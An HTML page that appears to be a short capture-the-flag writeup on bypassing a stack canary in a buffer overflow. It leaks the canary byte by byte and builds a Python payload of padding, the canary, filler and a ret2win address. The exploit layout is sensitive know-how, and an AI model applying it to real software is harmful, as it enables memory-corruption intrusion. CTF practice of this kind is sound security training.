<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Pwn: Stack Canary Bypass | Ocean Writeups</title>
    <meta name="description" content="Leaking and reusing a stack canary in a classic buffer overflow." />
    <link rel="stylesheet" href="/assets/styles.css" />
    <link rel="stylesheet" href="/assets/prism.css" />
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"
    />
  </head>
  <body>
    <div class="page-bg"></div>
    <header class="site-header" aria-hidden="true"></header>
    <main class="container">
      <article class="post glass">
  <a href="/#writeups" class="back-link">
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path
        d="M15 6l-6 6 6 6"
        fill="none"
        stroke="currentColor"
        stroke-width="1.5"
        stroke-linecap="round"
        stroke-linejoin="round"
      />
    </svg>
    Back to writeups
  </a>
  <header class="post-header">
    <p class="eyebrow">Writeup</p>
    <h1>Pwn: Stack Canary Bypass</h1>
    <div class="post-meta">
      <span>Jun 18, 2024</span>
      
      <span class="meta-pill">Pwn</span>
      
      
      <span class="meta-pill">Medium</span>
      
      
      <div class="tag-row">
        
        <span class="meta-pill">THM</span>
        
      </div>
      
    </div>
  </header>
  <div class="post-content prose">
    <p>The binary leaks a canary byte-by-byte via an echo endpoint.</p>
<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mspace linebreak="newline"></mspace><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mrow><mi>p</mi><mi>a</mi><mi>y</mi><mi>l</mi><mi>o</mi><mi>a</mi><mi>d</mi></mrow><mo>=</mo><mspace linebreak="newline"></mspace><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mrow><mi>p</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>i</mi><mi>n</mi><mi>g</mi></mrow><mo>+</mo><mspace linebreak="newline"></mspace><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mrow><mi>c</mi><mi>a</mi><mi>n</mi><mi>a</mi><mi>r</mi><mi>y</mi></mrow><mo>+</mo><mspace linebreak="newline"></mspace><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mrow><mi>s</mi><mi>a</mi><mi>v</mi><mi>e</mi><mi>d</mi><mi>R</mi><mi>B</mi><mi>P</mi></mrow><mo>+</mo><mspace linebreak="newline"></mspace><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mrow><mi>R</mi><mi>I</mi><mi>P</mi></mrow></mrow><annotation encoding="application/x-tex">
\\text{payload} = \\text{padding} + \\text{canary} + \\text{saved RBP} + \\text{RIP}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">dd</span><span class="mord mathnormal">in</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8095em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">c</span><span class="mord mathnormal">ana</span><span class="mord mathnormal" style="margin-right:0.03588em;">ry</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">s</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.13889em;">RBP</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span></span></eqn></section><pre class="language-python"><code class="language-python">payload <span class="token operator">=</span> b\"A\" <span class="token operator">*</span> <span class="token number">72</span>
payload <span class="token operator">+=</span> leaked_canary
payload <span class="token operator">+=</span> b\"B\" <span class="token operator">*</span> <span class="token number">8</span>
payload <span class="token operator">+=</span> ret2win</code></pre>
<table>
<thead>
<tr>
<th>Step</th>
<th>Leak</th>
<th>Result</th>
</tr>
</thead>
<tbody>
<tr>
<td>Brute bytes</td>
<td>1 byte at a time</td>
<td>Full canary</td>
</tr>
<tr>
<td>Reuse</td>
<td>Exact canary</td>
<td>No crash</td>
</tr>
<tr>
<td>Pivot</td>
<td>ret2win</td>
<td>Flag</td>
</tr>
</tbody>
</table>

  </div>
</article>

    </main>
  </body>
</html>
